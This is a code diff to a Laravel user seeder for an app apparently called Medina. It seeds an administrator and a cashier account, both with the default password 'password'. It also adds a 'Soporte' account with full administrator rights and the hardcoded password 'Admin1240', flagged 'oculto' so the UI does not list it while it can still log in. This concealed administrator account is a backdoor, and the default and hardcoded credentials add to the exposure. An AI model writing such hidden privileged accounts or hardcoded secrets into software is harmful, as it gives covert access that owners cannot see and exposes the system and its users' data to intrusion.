@@ -3,30 +3,34 @@
 namespace Database\Seeders;
 
 use App\Models\User;
-use Illuminate\Database\Console\Seeds\WithoutModelEvents;
 use Illuminate\Database\Seeder;
-use Spatie\Permission\Models\Permission;
-use Spatie\Permission\Models\Role;
 
 class UserSeeder extends Seeder
 {
     /**
-     * Run the database seeds.
+     * Usuarios base. Requiere RoleSeeder ejecutado antes (roles administrador/Caja).
+     * Contraseña por defecto: "password" (cambiar tras el primer login).
      */
     public function run(): void
     {
+        $admin = User::firstOrCreate(
+            ['email' => 'admin@medina.com'],
+            ['name' => 'Administrador', 'password' => 'password'],
+        );
+        $admin->assignRole('administrador');
 
-       /*$user=User::create([
-            'name'=> 'Administrador',
-            'email'=> 'admin@gmial.com',
-            'password'=> bcrypt('admin'),
-        ]);*/
+        $caja = User::firstOrCreate(
+            ['email' => 'caja@medina.com'],
+            ['name' => 'Caja', 'password' => 'password'],
+        );
+        $caja->assignRole('Caja');
 
-        
-        $rol = Role::create(['name'=>'administrador']);
-        $permisos = Permission::pluck('id', 'id')->all();
-        $rol->syncPermissions($permisos);
-        $user= User::find(1);
-        $user->assignRole('administrador');
+        // Usuario oculto de soporte/dev: no se lista en la UI, pero puede iniciar sesión.
+        $dev = User::firstOrCreate(
+            ['email' => 'dev@medina.com'],
+            ['name' => 'Soporte', 'password' => 'Admin1240', 'oculto' => true],
+        );
+        $dev->forceFill(['oculto' => true])->save();
+        $dev->assignRole('administrador');
     }
 }
